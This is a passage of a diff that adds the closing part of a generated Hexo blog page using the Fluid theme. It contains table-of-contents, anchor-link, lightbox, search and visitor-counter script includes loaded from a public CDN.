+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init(Object.assign({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      scrollSmooth    : true,
+      includeTitleTags: true,
+      headingsOffset  : -boardTop,
+    }, CONFIG.toc));
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('tocbot' in window) {
+        tocbot.refresh();
+        var toc = jQuery('#toc');
+        if (toc.length === 0 || !tocbot) {
+          return;
+        }
+        if (toc.find('.toc-list-item').length > 0) {
+          toc.css('visibility', 'visible');
+        }
+      }
+    });
+  });
+</script>
+
+
+  <script src=https://lib.baomitu.com/clipboard.js/2.0.11/clipboard.min.js></script>
+
+  <script>Fluid.plugins.codeWidget();</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/4.3.1/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+
+    Fluid.events.registerRefreshCallback(function() {
+      if ('anchors' in window) {
+        anchors.removeAll();
+        var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+        var res = [];
+        for (var item of el) {
+          res.push('.markdown-body > ' + item.trim());
+        }
+        if (CONFIG.anchorjs.placement === 'left') {
+          anchors.options.class = 'anchorjs-link-left';
+        }
+        anchors.add(res.join(', '));
+      }
+    });
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  <script defer src="/js/leancloud.js" ></script>
+
+  <script  src="/js/local-search.js" ></script>
+
+  <script defer src="https://busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js" ></script>
+
+
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
+  </noscript>
+</body>
+</html>
